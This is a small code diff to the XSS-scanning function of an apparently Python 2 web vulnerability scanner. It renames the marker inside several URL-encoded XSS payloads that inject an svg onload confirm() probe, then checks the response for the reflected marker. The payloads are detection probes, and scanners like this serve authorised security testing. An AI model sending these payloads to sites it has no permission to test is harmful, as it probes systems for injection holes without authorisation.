@@ -60,9 +60,9 @@ def rce_func(url):
 def xss_func(url):
         print ga.bold+"\n [!] Now Scanning for XSS "+ga.end
         print ga.blue+" [!] Please wait ...."+ga.end
-        #Paylod zigoo="css();" added for XSS in <a href TAG's
-        payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', '%78%22%78%3e%78']
-        payloads += ['%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fzigoo0%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
+        #Paylod dadevil="css();" added for XSS in <a href TAG's
+        payloads = ['%27%3Edadevil0%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', '%78%22%78%3e%78']
+        payloads += ['%22%3Edadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb', 'dadevil%3Csvg%2Fonload%3Dconfirm%28%2Fdadevil%2F%29%3Eweb']
         check = re.compile('dadevil<svg|x>x', re.I)
         main_function(url, payloads, check)
 
